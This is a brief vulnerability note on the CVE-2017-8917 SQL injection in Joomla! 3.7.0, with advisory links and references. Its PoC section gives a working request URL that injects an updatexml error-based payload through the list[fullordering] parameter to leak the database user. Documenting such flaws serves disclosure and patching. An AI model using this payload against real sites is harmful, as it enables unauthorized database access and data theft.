# Joomla! 3.7.0 SQL注入

## Official

https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html

http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917

## Affected Version

Joomla! 3.7.0

## PoC

直接访问,爆出数据库用户名：

    http://foo.com/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)

![poc.png](poc.png)



## References

1. http://blog.nsfocus.net/joomla-3-7-0-sql-injection-vulnerability/
